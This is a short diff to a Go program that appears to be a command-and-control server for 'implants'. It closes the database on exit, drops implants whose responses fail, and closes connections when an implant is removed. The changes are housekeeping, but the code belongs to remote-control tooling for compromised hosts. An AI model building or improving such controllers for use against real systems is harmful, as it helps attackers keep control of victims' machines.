@@ -45,6 +45,10 @@ func main() {
 	go acceptConnections(ln)
 
 	startCLI()
+
+	if db != nil {
+		db.Close()
+	}
 }
 
 func loadPrivateKey() {
@@ -175,6 +179,9 @@ func sendCommand(ip, command string) {
 	encResp, err := reader.ReadString('\n')
 	if err != nil {
 		fmt.Println("[-] Failed to read response")
+		mutex.Lock()
+		delete(implants, ip)
+		mutex.Unlock()
 		return
 	}
 	encResp = strings.TrimSpace(encResp)
@@ -206,9 +213,15 @@ func broadcastCommand(command string) {
 
 func removeImplant(ip string) {
 	mutex.Lock()
-	defer mutex.Unlock()
-	delete(implants, ip)
-	fmt.Printf("[+] Removed implant %s\n", ip)
+	conn, exists := implants[ip]
+	if exists {
+		conn.Close()
+		delete(implants, ip)
+	}
+	mutex.Unlock()
+	if exists {
+		fmt.Printf("[+] Removed implant %s\n", ip)
+	}
 }
 
 func printHelp() {
